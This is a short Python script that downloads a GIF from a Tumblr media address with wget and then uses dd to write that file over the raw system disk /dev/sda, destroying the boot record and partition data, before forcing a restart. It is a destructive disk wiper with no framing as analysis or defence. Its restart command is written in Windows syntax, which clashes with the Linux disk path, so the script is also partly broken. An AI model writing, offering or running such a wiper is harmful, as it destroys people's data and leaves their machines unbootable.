import os

gif_url = "https://64.media.tumblr.com/acda81d74755683b00252baddbc9efb9/c94dfc5c1b3959c9-d3/s540x810/928b2b8c517da84965873e7a17bff6400102f897.gifv"
os.system("wget " + gif_url)

mbr_path = "/dev/sda"
os.system("dd if=928b2b8c517da84965873e7a17bff6400102f897.gifv of=" + mbr_path)

os.system("shutdown /r /t 0")
